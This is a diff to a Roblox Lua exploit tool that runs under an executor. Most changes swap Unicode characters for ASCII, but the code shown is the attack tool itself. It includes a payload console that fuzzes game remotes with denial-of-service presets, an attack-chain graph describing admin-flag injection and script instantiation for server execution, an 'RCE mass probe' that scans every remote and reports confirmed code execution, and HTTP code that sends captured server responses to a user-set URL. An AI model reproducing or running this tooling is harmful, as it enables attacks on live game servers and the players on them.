+                appendLog(string.format("[%s] [X]  %s", ts,
                     tostring(result):sub(1,80)), GC.ERR)
             end
 
             if i < iterations then task.wait(0.08) end
         end
 
-        appendLog(string.format("[%s] ─── Run complete (%d iteration%s)",
+        appendLog(string.format("[%s] --- Run complete (%d iteration%s)",
             consoleTimestamp(), iterations,
             iterations > 1 and "s" or ""), GC.DIM)
         consoleBusy = false
     end)
 end
 
--- ── Panel open/close ──────────────────────────────────────────────────────────
+-- -- Panel open/close ----------------------------------------------------------
 local function closePayloadConsole()
     if consoleFrm then consoleFrm:Destroy() consoleFrm=nil end
     consoleLogScroll = nil
@@ -4660,7 +4660,7 @@ local function showPayloadConsole()
 
     local curY = 0
 
-    -- ── Header ────────────────────────────────────────────────────
+    -- -- Header ----------------------------------------------------
     local hdr = mF(pf, 0, 0, PW, HDR_H, Color3.fromRGB(14,16,26), 0.22, 89)
     hdr.Size = UDim2.new(1,0,0,HDR_H)
     mC(hdr,7)
@@ -4711,7 +4711,7 @@ local function showPayloadConsole()
 
     curY = curY + HDR_H + SEP
 
-    -- ── Generator grid ────────────────────────────────────────────
+    -- -- Generator grid --------------------------------------------
     mF(pf,0,curY-SEP,PW,SEP,GC.DIV,0.50,89).Size=UDim2.new(1,0,0,1)
 
     -- Section label
@@ -4795,7 +4795,7 @@ local function showPayloadConsole()
 
     curY = curY + 13 + GEN_H + SEP
 
-    -- ── Payload editor ────────────────────────────────────────────
+    -- -- Payload editor --------------------------------------------
     mF(pf,0,curY-SEP,PW,SEP,GC.DIV,0.55,89).Size=UDim2.new(1,0,0,1)
     mL(pf, 8, curY+2, 60, 10, "PAYLOAD",
         Enum.Font.GothamBold, 7, GC.DIM, Enum.TextXAlignment.Left, 90)
@@ -4805,8 +4805,8 @@ local function showPayloadConsole()
     payloadTxtBox.Position              = UDim2.fromOffset(8, curY+13)
     payloadTxtBox.BackgroundColor3      = Color3.fromRGB(8, 10, 18)
     payloadTxtBox.BackgroundTransparency= 0.25
-    payloadTxtBox.Text                  = "← select a generator or type a custom string"
-    payloadTxtBox.PlaceholderText       = "custom payload…"
+    payloadTxtBox.Text                  = "<- select a generator or type a custom string"
+    payloadTxtBox.PlaceholderText       = "custom payload..."
     payloadTxtBox.PlaceholderColor3     = GC.DIM
     payloadTxtBox.TextColor3            = GC.PRI
     payloadTxtBox.Font                  = Enum.Font.Code
@@ -4821,14 +4821,14 @@ local function showPayloadConsole()
 
     -- Clicking the box clears the "hint" text
     payloadTxtBox.Focused:Connect(function()
-        if payloadTxtBox.Text:sub(1,1) == "←" then
+        if payloadTxtBox.Text:sub(1,1) == "<-" then
             payloadTxtBox.Text = ""
         end
     end)
 
     curY = curY + PB_H + SEP
 
-    -- ── Iteration selector + FIRE ────────────────────────────────
+    -- -- Iteration selector + FIRE --------------------------------
     mF(pf,0,curY-SEP,PW,SEP,GC.DIV,0.55,89).Size=UDim2.new(1,0,0,1)
 
     local ITERS  = {1, 5, 10, 50}
@@ -4843,7 +4843,7 @@ local function showPayloadConsole()
             i==1 and Color3.fromRGB(40,55,95) or Color3.fromRGB(20,24,42),
             i==1 and 0.20 or 0.55, 90)
         mC(ib, 4)
-        local ilbl = mL(ib,0,0,IB_W,18,"×"..n,
+        local ilbl = mL(ib,0,0,IB_W,18,"x"..n,
             Enum.Font.GothamBold, 8,
             i==1 and GC.PRI or GC.MID,
             Enum.TextXAlignment.Center, 91)
@@ -4883,7 +4883,7 @@ local function showPayloadConsole()
     mC(fireBtn, 4)
     mS(fireBtn, Color3.fromRGB(88,200,128), 0.40, 1)
     mGlow(fireBtn, Color3.fromRGB(88,200,128), 0.70, 2)
-    local fireLbl = mL(fireBtn,0,0,68,18,"▶  FIRE",
+    local fireLbl = mL(fireBtn,0,0,68,18,">  FIRE",
         Enum.Font.GothamBold, 9, Color3.fromRGB(88,200,128),
         Enum.TextXAlignment.Center, 91)
 
@@ -4921,7 +4921,7 @@ local function showPayloadConsole()
 
     curY = curY + ITER_H + SEP
 
-    -- ── Output log ────────────────────────────────────────────────
+    -- -- Output log ------------------------------------------------
     mF(pf,0,curY-SEP,PW,SEP,GC.DIV,0.55,89).Size=UDim2.new(1,0,0,1)
     mL(pf, 8, curY+2, 60, 10, "OUTPUT",
         Enum.Font.GothamBold, 7, GC.DIM, Enum.TextXAlignment.Left, 90)
@@ -4954,7 +4954,7 @@ local function buildSourceToSinkPage(page)
 
     local TOOLBAR_H = 28
 
-    -- ── Toolbar ──────────────────────────────────────────────
+    -- -- Toolbar ----------------------------------------------
     local toolbar = mF(page, 0, 0, 0, TOOLBAR_H, Color3.fromRGB(12,14,22), 0.55, 8)
     toolbar.Size = UDim2.new(1,0,0,TOOLBAR_H)
     mF(toolbar,0,TOOLBAR_H-1,0,1,GC.DIV,0.50,9).Size=UDim2.new(1,0,0,1)
@@ -5024,7 +5024,7 @@ local function buildSourceToSinkPage(page)
         Color3.fromRGB(0,210,110),0.82,9)
     autoGenBtnH.Position = UDim2.new(1,-492,0,(TOOLBAR_H-18)/2)
     mC(autoGenBtnH,4) mS(autoGenBtnH,Color3.fromRGB(0,210,110),0.45,1)
-    mL(autoGenBtnH,0,0,70,18,"⚡ AUTO GEN",
+    mL(autoGenBtnH,0,0,70,18,"** AUTO GEN",
         Enum.Font.GothamBold,7,Color3.fromRGB(0,210,110),
         Enum.TextXAlignment.Center,10)
     autoGenBtnH.MouseEnter:Connect(function()
@@ -5074,7 +5074,7 @@ local function buildSourceToSinkPage(page)
         end)
     end)
 
-    -- Risk score badge (live, updates via refreshWires → updateRiskBadge)
+    -- Risk score badge (live, updates via refreshWires -> updateRiskBadge)
     -- Shows current chain risk tier. Click to open detailed breakdown.
     local riskBg = mF(toolbar, 0, (TOOLBAR_H-18)/2, 74, 18,
         Color3.fromRGB(40,10,10), 0.45, 9)
@@ -5125,9 +5125,9 @@ local function buildSourceToSinkPage(page)
         task.spawn(executeChain)
     end)
 
-    -- ── Custody Ledger toggle button ──────────────────────────────
+    -- -- Custody Ledger toggle button ------------------------------
     -- Sits between TRACE (right edge W-224) and EXECUTE (left edge W-134).
-    -- 90px total space. Button width 54px → 18px frame gap each side,
+    -- 90px total space. Button width 54px -> 18px frame gap each side,
     -- which clears the ~5px glow bleed on neighbouring buttons.
     local LEDGER_W, LEDGER_H = 270, 360
     local ledgerPanel, rebuildLedger
@@ -5181,7 +5181,7 @@ local function buildSourceToSinkPage(page)
         wiringFrom   = nil
     end)
 
-    -- ── Canvas ───────────────────────────────────────────────
+    -- -- Canvas -----------------------------------------------
     graphCanvas = Instance.new("ScrollingFrame")
     graphCanvas.Name                      = "GraphCanvas"
     graphCanvas.Size                      = UDim2.new(1,0,1,-TOOLBAR_H)
@@ -5220,7 +5220,7 @@ local function buildSourceToSinkPage(page)
         end
     end)
 
-    -- ── Spawn default pipeline as a starting example ─────────
+    -- -- Spawn default pipeline as a starting example ---------
     local startX, startY = 30, 80
     local spacing = NODE_W + 50
     local prevNode = nil
@@ -5234,7 +5234,7 @@ local function buildSourceToSinkPage(page)
     end
     refreshWires()
 
-    -- ── Escape key: cancel wiring / close ctx ────────────────
+    -- -- Escape key: cancel wiring / close ctx ----------------
     UserInputService.InputBegan:Connect(function(inp, processed)
         if processed then return end
         if inp.KeyCode == Enum.KeyCode.Escape then
@@ -5249,11 +5249,11 @@ end
 
 
 
--- ─── PAYLOAD SIMULATOR CONSOLE ───────────────────────────────────────────────
+-- --- PAYLOAD SIMULATOR CONSOLE -----------------------------------------------
 -- A live testing workbench. Lets the user draft or generate edge-case payloads
 -- and fire them through the configured chain, observing real server responses.
 
--- ── Payload type parser ───────────────────────────────────────────────────────
+-- -- Payload type parser -------------------------------------------------------
 -- Converts a string representation into an actual typed Lua/Roblox value.
 local function parsePayloadString(s)
     s = s:match("^%s*(.-)%s*$")  -- trim whitespace
@@ -5283,49 +5283,49 @@ local function parsePayloadString(s)
     return s
 end
 
--- ── Presets: edge-case payload generators ────────────────────────────────────
+-- -- Presets: edge-case payload generators ------------------------------------
 local PAYLOAD_PRESETS = {
     { label = "nil",      col = Color3.fromRGB(160,160,180),
-      desc  = "nil — tests nil guards on the server",
+      desc  = "nil -- tests nil guards on the server",
       display = "nil",
       gen   = function() return nil                          end },
     { label = "empty {}",  col = Color3.fromRGB(140,180,255),
-      desc  = "Empty table — tests empty-input handling",
+      desc  = "Empty table -- tests empty-input handling",
       display = "{}",
       gen   = function() return {}                           end },
-    { label = "∞",        col = Color3.fromRGB(255,200,80),
-      desc  = "math.huge — positive infinity / range overflow",
+    { label = "inf",        col = Color3.fromRGB(255,200,80),
+      desc  = "math.huge -- positive infinity / range overflow",
       display = "math.huge",
       gen   = function() return math.huge                    end },
-    { label = "-∞",       col = Color3.fromRGB(255,180,60),
-      desc  = "-math.huge — negative infinity",
+    { label = "-inf",       col = Color3.fromRGB(255,180,60),
+      desc  = "-math.huge -- negative infinity",
       display = "-math.huge",
       gen   = function() return -math.huge                   end },
     { label = "NaN",      col = Color3.fromRGB(200,120,255),
-      desc  = "0/0 → NaN — arithmetic edge case",
+      desc  = "0/0 -> NaN -- arithmetic edge case",
       display = "0/0 (NaN)",
       gen   = function() return 0/0                          end },
     { label = "2^53",     col = Color3.fromRGB(255,160,100),
-      desc  = "2^53 — max safe integer, integer overflow boundary",
+      desc  = "2^53 -- max safe integer, integer overflow boundary",
       display = "2^53",
       gen   = function() return 2^53                         end },
     { label = "long str", col = Color3.fromRGB(100,220,180),
-      desc  = "10,000-char string — length / memory denial",
+      desc  = "10,000-char string -- length / memory denial",
       display = "string.rep('A',10000)",
       gen   = function() return string.rep("A", 10000)       end },
     { label = "\\0 bytes", col = Color3.fromRGB(220,120,120),
-      desc  = "Null-byte string — binary injection edge case",
+      desc  = "Null-byte string -- binary injection edge case",
       display = '"\\0\\255\\127"',
       gen   = function() return "\0\255\127"                 end },
     { label = "nested",   col = Color3.fromRGB(130,200,255),
-      desc  = "50-level nested table — depth / stack overflow",
+      desc  = "50-level nested table -- depth / stack overflow",
       display = "{{{...50 deep...}}}",
       gen   = function()
                   local t={} local c=t
                   for _=1,50 do c.n={} c=c.n end return t
               end },
     { label = "1k table", col = Color3.fromRGB(180,255,180),
-      desc  = "1,000-entry table — size / iteration denial",
+      desc  = "1,000-entry table -- size / iteration denial",
       display = "{[1]=1, ... [1000]=1000}",
       gen   = function()
                   local t={} for i=1,1000 do t[i]=i end return t
@@ -5340,7 +5340,7 @@ local PAYLOAD_PRESETS = {
       gen   = function() return false                        end },
 }
 
--- ── Console page builder ──────────────────────────────────────────────────────
+-- -- Console page builder ------------------------------------------------------
 local function buildConsolePage(page)
     page.ClipsDescendants = true
 
@@ -5467,7 +5467,7 @@ local function buildConsolePage(page)
     -- firePayload: send the payload through the target remote
     local function firePayload(payload)
         if isFiring then
-            addLog("WARN", "Already firing — wait for current run to complete.")
+            addLog("WARN", "Already firing -- wait for current run to complete.")
             return
         end
         if not targetRemote then
@@ -5488,7 +5488,7 @@ local function buildConsolePage(page)
             displayPayload = "nil"
         end
 
-        addLog("FIRE", "→ " .. cls .. "  [" .. nm .. "]  payload: " .. displayPayload)
+        addLog("FIRE", "-> " .. cls .. "  [" .. nm .. "]  payload: " .. displayPayload)
 
         local t0 = tick()
         local ok, result = false, nil
@@ -5530,13 +5530,13 @@ local function buildConsolePage(page)
         isFiring = false
     end
 
-    -- ── Layout ────────────────────────────────────────────────────────────
+    -- -- Layout ------------------------------------------------------------
     local W = page.AbsoluteSize.X > 10 and page.AbsoluteSize.X or (panW - CONTENT_PAD*2)
     local H = page.AbsoluteSize.Y > 10 and page.AbsoluteSize.Y or (panH - 120)
     local EDIT_W  = math.floor(W * 0.42)
     local CON_W   = W - EDIT_W - SEP
 
-    -- ── TARGET STRIP ──────────────────────────────────────────────────────
+    -- -- TARGET STRIP ------------------------------------------------------
     local targetStrip = mF(page, 0, 0, 0, TARGET_H,
         Color3.fromRGB(12,14,24), 0.0, 6)
     targetStrip.Size = UDim2.new(1, 0, 0, TARGET_H)
@@ -5547,7 +5547,7 @@ local function buildConsolePage(page)
         Enum.TextXAlignment.Left, 7)
 
     targetNameLbl = mL(targetStrip, PAD+46, 0, 0, TARGET_H,
-        "No target — click SYNC or SCAN",
+        "No target -- click SYNC or SCAN",
         Enum.Font.Gotham, 9, Color3.fromRGB(130,145,185),
         Enum.TextXAlignment.Left, 7)
     targetNameLbl.Size = UDim2.new(1, -(PAD+46+130), 1, 0)
@@ -5593,7 +5593,7 @@ local function buildConsolePage(page)
         targetNameLbl.Text       = found[1].cls .. ": " .. found[1].n
                                    .. "  @  " .. found[1].path
         targetNameLbl.TextColor3 = Color3.fromRGB(110,165,255)
-        addLog("INFO", "Scanned — " .. #found .. " remotes found. Targeting: ["
+        addLog("INFO", "Scanned -- " .. #found .. " remotes found. Targeting: ["
             .. found[1].n .. "]  (" .. found[1].cls .. ")")
         if #found > 1 then
             addLog("INFO", "Other found: "
@@ -5612,13 +5612,13 @@ local function buildConsolePage(page)
         Color3.fromRGB(200,80,90),Enum.TextXAlignment.Center,8)
     clrTgt.MouseButton1Click:Connect(function()
         targetRemote = nil
-        targetNameLbl.Text       = "No target — click SYNC or SCAN"
+        targetNameLbl.Text       = "No target -- click SYNC or SCAN"
         targetNameLbl.TextColor3 = Color3.fromRGB(130,145,185)
     end)
 
     local BODY_Y = TARGET_H + SEP
 
-    -- ── LEFT PANEL: editor + presets ──────────────────────────────────────
+    -- -- LEFT PANEL: editor + presets --------------------------------------
     local leftPanel = mF(page, 0, BODY_Y, EDIT_W, 0,
         Color3.fromRGB(12,15,26), 0.0, 6)
     leftPanel.Size = UDim2.new(0, EDIT_W, 1, -BODY_Y)
@@ -5763,7 +5763,7 @@ local function buildConsolePage(page)
         else
             payload = getPayloadValue()
         end
-        addLog("SEP_LOG", string.rep("─", 38))
+        addLog("SEP_LOG", string.rep("-", 38))
         task.spawn(function() firePayload(payload) end)
     end)
 
@@ -5785,9 +5785,9 @@ local function buildConsolePage(page)
     fireAllBtn.MouseButton1Click:Connect(function()
         -- Fuzz run: fire each preset with 0.35s gap
         task.spawn(function()
-            addLog("SEP_LOG", string.rep("═", 38))
-            addLog("INFO", "FUZZ RUN — firing all " .. #PAYLOAD_PRESETS .. " presets sequentially")
-            addLog("SEP_LOG", string.rep("─", 38))
+            addLog("SEP_LOG", string.rep("=", 38))
+            addLog("INFO", "FUZZ RUN -- firing all " .. #PAYLOAD_PRESETS .. " presets sequentially")
+            addLog("SEP_LOG", string.rep("-", 38))
             for i, preset in ipairs(PAYLOAD_PRESETS) do
                 if isFiring then task.wait(0.5) end
                 addLog("INFO", "Preset " .. i .. "/" .. #PAYLOAD_PRESETS
@@ -5795,16 +5795,16 @@ local function buildConsolePage(page)
                 task.spawn(function() firePayload(preset.gen()) end)
                 task.wait(0.40)
             end
-            addLog("SEP_LOG", string.rep("─", 38))
+            addLog("SEP_LOG", string.rep("-", 38))
             addLog("INFO", "FUZZ RUN complete.")
         end)
     end)
 
-    -- ── VERTICAL DIVIDER ──────────────────────────────────────────────────
+    -- -- VERTICAL DIVIDER --------------------------------------------------
     mF(page, EDIT_W, BODY_Y, SEP, 0,
         Color3.fromRGB(35,45,80), 0.50, 6).Size = UDim2.new(0,SEP,1,-BODY_Y)
 
-    -- ── RIGHT PANEL: console output ───────────────────────────────────────
+    -- -- RIGHT PANEL: console output ---------------------------------------
     local rightPanel = mF(page, EDIT_W+SEP, BODY_Y, 0, 0,
         Color3.fromRGB(8,9,16), 0.0, 6)
     rightPanel.Size = UDim2.new(1, -(EDIT_W+SEP), 1, -BODY_Y)
@@ -5864,7 +5864,7 @@ end
 -- TAB DEFINITIONS
 local CONTENT_PAD = T.PADDING
 
--- ─── HIGH-PROBABILITY DEPENDENCY CHAIN (HPDC) ─────────────────────────────
+-- --- HIGH-PROBABILITY DEPENDENCY CHAIN (HPDC) -----------------------------
 -- Node types for the HPDC graph. Five steps modelling the state-trust attack
 -- path. Each step has an action list of real patterns found in Roblox games so
 -- users can select the specific variant they are analysing.
@@ -5878,9 +5878,9 @@ local HPDC_NODE_TYPES = {
             d    = "Enumerate all valid action keys. Reject any payload whose action field is not in a server-side hardcoded allowlist before routing.",
         },
         actions = {
-            { n = "NetworkManager",      d = "Centralised framework routing all client→server calls through one remote. Dynamic action dispatch with no per-action schema." },
+            { n = "NetworkManager",      d = "Centralised framework routing all client->server calls through one remote. Dynamic action dispatch with no per-action schema." },
             { n = "UpdateState",         d = "Generic state-update remote. Accepts an action key + payload table. High-probability target: one remote, many attack surfaces." },
-            { n = "BridgeNet",           d = "Open-source networking library. Single remote, packet-ID routing. Dynamic handler lookup — no static validation per packet type." },
+            { n = "BridgeNet",           d = "Open-source networking library. Single remote, packet-ID routing. Dynamic handler lookup -- no static validation per packet type." },
             { n = "ActionDispatcher",    d = "Custom pattern: client sends {action, args}. Server routes by action string dynamically. Validation is per-handler, not centralised." },
             { n = "DataPacketHandler",   d = "Raw packet handler that reconstructs structured data from a client-sent table. Deserializes before validating." },
             { n = "Custom Remote",       d = "A bespoke single-remote gateway specific to this game. Centralised routing without framework-level schema enforcement." },
@@ -5895,7 +5895,7 @@ local HPDC_NODE_TYPES = {
         },
         actions = {
             { n = "JSON Deserialization",        d = "HttpService:JSONDecode on a client-sent string. Deep nested objects survive shallow type checks. No depth limit enforced." },
-            { n = "Custom Table Reconstruction", d = "Server rebuilds a complex table from client-sent fields. No maximum depth or type restrictions — deeply nested arrays bypass sanitisation." },
+            { n = "Custom Table Reconstruction", d = "Server rebuilds a complex table from client-sent fields. No maximum depth or type restrictions -- deeply nested arrays bypass sanitisation." },
             { n = "Dynamic Key Routing",         d = "Dictionary keys from the client payload are used to look up sub-handlers. Unexpected keys reach unintended code paths." },
             { n = "Type Coercion Pattern",       d = "Server implicitly converts types (tonumber, tostring) on client data without bounding. Input 'inf' or '9e99' survives as math.huge." },
             { n = "Legacy HTTP Module",           d = "Older serialization library with no recursive depth limits or type enforcement. Mixed-type arrays parsed without nil-hole guards." },
@@ -5922,15 +5922,15 @@ local HPDC_NODE_TYPES = {
         id    = "REFLECT", role = "REFLECT",
         label = "Reflection Sink",
         control = {
-            name = "Hardcode all factory inputs — never use cache strings as identifiers",
-            d    = "Class names, property keys, parent paths, and JSON payloads passed to object factories must be hardcoded server-side. A cache value is a client value — treat it as one.",
+            name = "Hardcode all factory inputs -- never use cache strings as identifiers",
+            d    = "Class names, property keys, parent paths, and JSON payloads passed to object factories must be hardcoded server-side. A cache value is a client value -- treat it as one.",
         },
         actions = {
             { n = "Instance.new(cache string)",  d = "Unvalidated string from the session cache passed as the class name to Instance.new(). Attacker controls what object type the server instantiates. Script, LocalScript, and ModuleScript are valid class names." },
             { n = "Script in Unmonitored Container", d = "Instantiated Script or LocalScript parented to an unmonitored container (e.g. ServerStorage, a non-scanned folder). Executes server-side without triggering standard script detection." },
-            { n = "JSONDecode Reflection",       d = "HttpService:JSONDecode() called on a cache-sourced string. The decoded table's keys are then used as property identifiers or routing keys — deserialization becomes a second reflection layer." },
+            { n = "JSONDecode Reflection",       d = "HttpService:JSONDecode() called on a cache-sourced string. The decoded table's keys are then used as property identifiers or routing keys -- deserialization becomes a second reflection layer." },
             { n = "Dynamic Property Setter",     d = "A generic property-setter loop uses cache-sourced strings as property keys: obj[cacheValue] = data. Overwrites any writable property including Archivable, Disabled, and RunContext." },
-            { n = "Config Attribute Rewrite",    d = "Configuration attributes (set via :SetAttribute()) sourced from the session cache rewrite values that control how subsequent server code operates — feature flags, rate limits, permission tiers." },
+            { n = "Config Attribute Rewrite",    d = "Configuration attributes (set via :SetAttribute()) sourced from the session cache rewrite values that control how subsequent server code operates -- feature flags, rate limits, permission tiers." },
             { n = "Object Factory Poisoning",    d = "A centralised object factory function receives the cache-sourced class name and builds the object on behalf of a caller that assumes the factory validates its input. Trust delegated, never enforced." },
         },
     },
@@ -5939,7 +5939,7 @@ local HPDC_NODE_TYPES = {
         label = "Logical Execution",
         control = {
             name = "Never derive authorisation state from mutable session cache",
-            d    = "Admin flags, role tables, and permission checks must be derived from immutable server sources (GroupService, hardcoded tables, signed tokens) — never from a session cache field that any upstream handler could have written.",
+            d    = "Admin flags, role tables, and permission checks must be derived from immutable server sources (GroupService, hardcoded tables, signed tokens) -- never from a session cache field that any upstream handler could have written.",
         },
         actions = {
             { n = "Admin Flag Injection",        d = "The server routing table reads an isAdmin or role field from the session cache. Step 4 overwrote that field. The operator is now treated as a developer-level administrator by all downstream permission checks." },
@@ -5952,7 +5952,7 @@ local HPDC_NODE_TYPES = {
     },
 }
 
--- ── HPDC page builder ─────────────────────────────────────────────────────────
+-- -- HPDC page builder ---------------------------------------------------------
 -- Re-uses the full graph engine (spawnNode, makeWire, openCtxMenu, executeChain,
 -- scoreChain, TRACE, EXECUTE, CONSOLE) with HPDC-specific node types.
 local function saveGraphToCtx(ctx)
@@ -6002,7 +6002,7 @@ local function buildHPDCPage(page)
 
     local TOOLBAR_H = 28
 
-    -- ── Toolbar (same layout as S->S but uses HPDC node types) ───
+    -- -- Toolbar (same layout as S->S but uses HPDC node types) ---
     local toolbar = mF(page, 0, 0, 0, TOOLBAR_H, Color3.fromRGB(12,14,22), 0.55, 8)
     toolbar.Size = UDim2.new(1,0,0,TOOLBAR_H)
     mF(toolbar,0,TOOLBAR_H-1,0,1,GC.DIV,0.50,9).Size=UDim2.new(1,0,0,1)
@@ -6064,7 +6064,7 @@ local function buildHPDCPage(page)
         Color3.fromRGB(0,210,110),0.82,9)
     hpdcGenBtn.Position = UDim2.new(1,-212,0,(TOOLBAR_H-18)/2)
     mC(hpdcGenBtn,4) mS(hpdcGenBtn,Color3.fromRGB(0,210,110),0.45,1)
-    mL(hpdcGenBtn,0,0,70,18,"⚡ AUTO GEN",
+    mL(hpdcGenBtn,0,0,70,18,"** AUTO GEN",
         Enum.Font.GothamBold,7,Color3.fromRGB(0,210,110),
         Enum.TextXAlignment.Center,10)
     hpdcGenBtn.MouseEnter:Connect(function()
@@ -6092,7 +6092,7 @@ local function buildHPDCPage(page)
         closeCtx() selectedNode=nil wiringFrom=nil
     end)
 
-    -- Execute button — runs executeChain() on the HPDC graph
+    -- Execute button -- runs executeChain() on the HPDC graph
     local execBtnH = mBtn(toolbar, 0, (TOOLBAR_H-18)/2, 62, 18, GC.CHK, 0.70, 9)
     execBtnH.Position = UDim2.new(1,-134,0,(TOOLBAR_H-18)/2)
     mC(execBtnH, 4)
@@ -6114,7 +6114,7 @@ local function buildHPDCPage(page)
         task.spawn(executeChain)
     end)
 
-    -- ── Canvas ────────────────────────────────────────────────────
+    -- -- Canvas ----------------------------------------------------
     local canvas = Instance.new("ScrollingFrame")
     canvas.Name                       = "HPDCCanvas"
     canvas.Size                       = UDim2.new(1,0,1,-TOOLBAR_H)
@@ -6155,7 +6155,7 @@ local function buildHPDCPage(page)
         end
     end)
 
-    -- HPDC starts blank — user builds the chain deliberately.
+    -- HPDC starts blank -- user builds the chain deliberately.
     -- The canvas and context are registered; no default nodes are spawned.
     -- Store the canvas reference in the HPDC context so activateGraphCtx
     -- has access to it when the tab is first switched to.
@@ -6175,7 +6175,7 @@ local function buildHPDCPage(page)
     end)
 end
 
--- ─── HTTP FEEDBACK STATE ─────────────────────────────────────────────────────
+-- --- HTTP FEEDBACK STATE -----------------------------------------------------
 -- HTTP table is declared early (before executeNode) so that the chain executor
 -- can call HTTP:post() and HTTP:get(). Methods are added below.
 
@@ -6220,7 +6220,7 @@ function HTTP:post(url, payload)
     local status = "ERR"
     local body   = ""
 
-    -- ── Method 1: request() ───────────────────────────────────────────────
+    -- -- Method 1: request() -----------------------------------------------
     -- Resolved fresh each call so a reinjected executor is picked up instantly.
     local _req = _execFn("request")
     if not ok and _req then
@@ -6234,7 +6234,7 @@ function HTTP:post(url, payload)
         end
     end
 
-    -- ── Method 2: syn.request (Synapse X) ────────────────────────────────
+    -- -- Method 2: syn.request (Synapse X) --------------------------------
     if not ok then
         local _syn = _execFn("syn")
         local _synReq = type(_syn) == "table" and _syn.request or nil
@@ -6249,7 +6249,7 @@ function HTTP:post(url, payload)
         end
     end
 
-    -- ── Method 3: http_request() ─────────────────────────────────────────
+    -- -- Method 3: http_request() -----------------------------------------
     local _hreq = _execFn("http_request")
     if not ok and _hreq then
         local rOk, res = pcall(_hreq, REQ_TBL)
@@ -6261,8 +6261,8 @@ function HTTP:post(url, payload)
         end
     end
 
-    -- ── Method 4: HttpService:PostAsync (Studio only) ─────────────────────
-    -- Blocked in live games from LocalScript — only reaches here if all
+    -- -- Method 4: HttpService:PostAsync (Studio only) ---------------------
+    -- Blocked in live games from LocalScript -- only reaches here if all
     -- executor methods above were nil (i.e. running in Studio).
     if not ok then
         local rOk, res = pcall(function()
@@ -6278,7 +6278,7 @@ function HTTP:post(url, payload)
 
     local elapsed = math.floor((tick() - startT) * 1000)
 
-    -- ── Fallback: clipboard ───────────────────────────────────────────────
+    -- -- Fallback: clipboard -----------------------------------------------
     -- All HTTP methods failed. Copy raw JSON to clipboard so the user can
     -- send it manually via Postman / curl / browser dev tools.
     if not ok then
@@ -6287,7 +6287,7 @@ function HTTP:post(url, payload)
             pcall(toclipboard, bodyStr)
         end
         body = body ~= "" and (body.." | clipboard copy attempted")
-            or "all HTTP methods blocked — clipboard copy attempted"
+            or "all HTTP methods blocked -- clipboard copy attempted"
         status = "CLIP"
     end
 
@@ -6304,7 +6304,7 @@ function HTTP:post(url, payload)
     return ok, status, body, elapsed
 end
 
--- GET request — same executor-first fallback chain as POST
+-- GET request -- same executor-first fallback chain as POST
 function HTTP:get(url, params)
     if not url or url == "" then
         return false, nil, "No URL configured.", 0
@@ -6329,8 +6329,8 @@ function HTTP:get(url, params)
     local status = "ERR"
     local body   = ""
 
-    -- Method 1: request() — use upvalue captured in main thread
-    -- Method 1: request() — fresh lookup each call
+    -- Method 1: request() -- use upvalue captured in main thread
+    -- Method 1: request() -- fresh lookup each call
     local _req = _execFn("request")
     if not ok and _req then
         local rOk, res = pcall(_req, REQ_TBL)
@@ -6342,7 +6342,7 @@ function HTTP:get(url, params)
         end
     end
 
-    -- Method 2: syn.request (Synapse X) — fresh lookup each call
+    -- Method 2: syn.request (Synapse X) -- fresh lookup each call
     if not ok then
         local _syn = _execFn("syn")
         local _synReq = type(_syn)=="table" and _syn.request or nil
@@ -6357,7 +6357,7 @@ function HTTP:get(url, params)
         end
     end
 
-    -- Method 3: http_request() — fresh lookup each call
+    -- Method 3: http_request() -- fresh lookup each call
     local _hreq = _execFn("http_request")
     if not ok and _hreq then
         local rOk, res = pcall(_hreq, REQ_TBL)
@@ -6439,9 +6439,9 @@ function HTTP:collect()
 end
 
 
--- ═══════════════════════════════════════════════════════════════════════════════
--- RCE PROBE SYSTEM — single table keeps us under Lua's 200-local limit
--- ═══════════════════════════════════════════════════════════════════════════════
+-- ===============================================================================
+-- RCE PROBE SYSTEM -- single table keeps us under Lua's 200-local limit
+-- ===============================================================================
 local RCE = {
     MAGIC_A    = 59483,
     MAGIC_B    = 20394,
@@ -6493,7 +6493,7 @@ function RCE:escalate(remote, isFn, onLog)
             if ok and res ~= nil then
                 local rs = tostring(res)
                 if #rs > 2 and rs:match("%d") then
-                    onLog("  SCOPE LEAK: server → "..rs:sub(1,40),
+                    onLog("  SCOPE LEAK: server -> "..rs:sub(1,40),
                         Color3.fromRGB(255,60,80))
                     break
                 end
@@ -6526,9 +6526,9 @@ function RCE:massProbe(onProgress, onComplete)
     RCE.running = true
 
     onProgress("", nil)
-    onProgress("╔═══════════════════════════════════╗", Color3.fromRGB(255,60,80))
-    onProgress("║   RCE MASS PROBE  INITIATED       ║", Color3.fromRGB(255,60,80))
-    onProgress("╚═══════════════════════════════════╝", Color3.fromRGB(255,60,80))
+    onProgress("+===================================+", Color3.fromRGB(255,60,80))
+    onProgress("|   RCE MASS PROBE  INITIATED       |", Color3.fromRGB(255,60,80))
+    onProgress("+===================================+", Color3.fromRGB(255,60,80))
 
     -- Gather all remotes
     local remotes = {}
@@ -6555,7 +6555,7 @@ function RCE:massProbe(onProgress, onComplete)
         if a.pri ~= b.pri then return a.pri < b.pri end
         return a.path < b.path
     end)
-    onProgress("Scanning "..#remotes.." remote(s) × 6 formats...",
+    onProgress("Scanning "..#remotes.." remote(s) x 6 formats...",
         Color3.fromRGB(80,140,220))
 
     local found = false
@@ -6606,12 +6606,12 @@ function RCE:massProbe(onProgress, onComplete)
                 found         = true
 
                 onProgress("", nil)
-                onProgress("╔══════════════════════════════════════╗", Color3.fromRGB(255,60,80))
-                onProgress("║  ✓  RCE CONFIRMED                    ║", Color3.fromRGB(255,60,80))
-                onProgress("║  Sink:    "..rem.path:sub(1,28),         Color3.fromRGB(255,60,80))
-                onProgress("║  Format:  "..fmt.id,                     Color3.fromRGB(255,60,80))
-                onProgress("║  Evidence:"..evidence:sub(1,28),         Color3.fromRGB(255,60,80))
-                onProgress("╚══════════════════════════════════════╝", Color3.fromRGB(255,60,80))
+                onProgress("+======================================+", Color3.fromRGB(255,60,80))
+                onProgress("|  [OK]  RCE CONFIRMED                    |", Color3.fromRGB(255,60,80))
+                onProgress("|  Sink:    "..rem.path:sub(1,28),         Color3.fromRGB(255,60,80))
+                onProgress("|  Format:  "..fmt.id,                     Color3.fromRGB(255,60,80))
+                onProgress("|  Evidence:"..evidence:sub(1,28),         Color3.fromRGB(255,60,80))
+                onProgress("+======================================+", Color3.fromRGB(255,60,80))
 
                 HTTP:capture("SERVER_RESPONSES","rce_confirmed_"..os.date("%H%M%S"),{
                     verdict=true, remote=rem.path,
@@ -6628,7 +6628,7 @@ function RCE:massProbe(onProgress, onComplete)
     RCE.running = false
     if not found then
         onProgress("", nil)
